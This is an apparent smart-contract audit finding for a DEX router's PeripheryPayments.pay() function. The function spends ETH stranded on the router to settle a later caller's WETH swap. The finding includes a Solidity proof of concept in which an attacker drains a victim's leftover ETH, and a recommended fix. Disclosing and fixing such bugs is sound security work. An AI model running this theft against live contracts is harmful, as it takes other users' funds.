### Title
Stranded ETH on the router is silently consumed by any subsequent WETH-input swap caller, enabling theft of prior users' native ETH — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

---

### Summary

The `pay()` helper in `PeripheryPayments.sol` unconditionally uses the router's native ETH balance before pulling WETH from the declared payer. Any ETH left on the router after a prior call (e.g., a user who sent more ETH than `amountIn` without including `refundETH` in the same multicall) is silently consumed to settle a completely different caller's WETH-input swap. The prior user loses their ETH; the attacker receives the swap output without spending any WETH or ETH of their own.

---

### Finding Description

`PeripheryPayments.pay()` handles the WETH branch as follows:

```solidity
} else if (token == WETH) {
    uint256 nativeBalance = address(this).balance;
    if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);   // payer never touched
    } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
    } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
``` [1](#0-0) 

When `nativeBalance >= value`, the function wraps the router's own ETH and transfers it to the pool — the `payer` argument is completely ignored. There is no check that the native ETH on the router belongs to the current caller.

ETH reaches the router legitimately via:

1. `exactInputSingle{value: X}` called directly (not via multicall) where `X > params.amountIn` — the excess has no in-call refund path.
2. `multicall{value: X}` where the user omits `refundETH` as the final step. [2](#0-1) 

The `receive()` guard only blocks direct ETH pushes; it does not prevent ETH from arriving via the `payable` swap entry-points. [3](#0-2) 

---

### Impact Explanation

**Direct loss of user principal.** The victim's ETH is consumed to settle a stranger's swap. The attacker receives real token output without spending any WETH or ETH. The loss equals the full amount of stranded ETH, which is bounded only by what the victim sent. There is no slippage floor that protects the victim because the theft occurs in a separate transaction after the victim's call has already completed.

---

### Likelihood Explanation

The trigger requires ETH to be stranded on the router. This is a realistic, non-exotic condition:

- A user calling `exactInputSingle{value: X}` directly (not via multicall) with `X > amountIn` has no mechanism to reclaim the excess in the same call.
- A user composing a multicall who forgets `refundETH` as the last step leaves the excess on-chain.

Once stranded ETH exists, any observer can exploit it in the very next block with a single `exactInputSingle` call specifying WETH as `tokenIn` and `amountIn` equal to the stranded amount — no special permissions, no approvals, no ETH required.

---

### Recommendation

Restrict the ETH-first payment path to the case where the router is paying from its own balance as an intermediate hop (i.e., `payer == address(this)`). For external payers, always pull WETH directly from the payer:

```solidity
} else if (token == WETH) {
    if (payer == address(this)) {
        // Intermediate hop: router holds the token, transfer directly.
        IERC20(WETH).safeTransfer(recipient, value);
    } else {
        // External payer: pull WETH; never consume router's native ETH on their behalf.
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
    }
}
```

The ETH-wrapping logic (depositing `msg.value` as WETH) should be performed explicitly before the swap call, not implicitly inside the callback, so that the amount wrapped is attributable to the current caller only.

---

### Proof of Concept

**Setup**: Router is deployed with WETH. A WETH/token1 pool exists with liquidity.

**Step 1 — Victim strands ETH:**
```solidity
// Victim sends 1 ETH but only needs 0.5 ETH for the swap.
// Called directly (not via multicall), so no refundETH is possible.
router.exactInputSingle{value: 1 ether}(ExactInputSingleParams({
    pool: pool,
    tokenIn: WETH,
    tokenOut: token1,
    zeroForOne: true,
    amountIn: 0.5 ether,   // only 0.5 ETH consumed
    amountOutMinimum: 0,
    recipient: victim,
    deadline: block.timestamp + 1,
    priceLimitX64: 0,
    extensionData: ""
}));
// Router now holds 0.5 ETH (stranded).
```

**Step 2 — Attacker steals it:**
```solidity
// Attacker has zero WETH, zero ETH approved. Sends no value.
router.exactInputSingle(ExactInputSingleParams({
    pool: pool,
    tokenIn: WETH,
    tokenOut: token1,
    zeroForOne: true,
    amountIn: 0.5 ether,   // matches stranded amount
    amountOutMinimum: 0,
    recipient: attacker,
    deadline: block.timestamp + 1,
    priceLimitX64: 0,
    extensionData: ""
}));
// In metricOmmSwapCallback → _justPayCallback → pay(WETH, attacker, pool, 0.5 ETH)
// router.balance == 0.5 ETH >= 0.5 ETH → deposits victim's ETH, transfers WETH to pool.
// Attacker receives token1 output. Victim's 0.5 ETH is gone.
``` [4](#0-3) [5](#0-4)

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L32-34)
```text
  receive() external payable {
    if (msg.sender != WETH) revert NotWETH();
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L69-88)
```text
  function pay(address token, address payer, address recipient, uint256 value) internal {
    // If the payer is contract it means we are in the middle of a path. In the middle of a path we operate on ERC20 only.
    if (payer == address(this)) {
      IERC20(token).safeTransfer(recipient, value);
    } else if (token == WETH) {
      uint256 nativeBalance = address(this).balance;
      if (nativeBalance >= value) {
        IWETH9(WETH).deposit{value: value}();
        IERC20(WETH).safeTransfer(recipient, value);
      } else if (nativeBalance > 0) {
        IWETH9(WETH).deposit{value: nativeBalance}();
        IERC20(WETH).safeTransfer(recipient, nativeBalance);
        IERC20(WETH).safeTransferFrom(payer, recipient, value - nativeBalance);
      } else {
        IERC20(WETH).safeTransferFrom(payer, recipient, value);
      }
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L192-199)
```text
  function _justPayCallback(int256 amount0Delta, int256 amount1Delta) private {
    pay(
      _getTokenToPay(),
      _getPayer(),
      msg.sender,
      uint256(MetricOmmSwapResults.extractPositiveAmount(amount0Delta, amount1Delta))
    );
  }
```
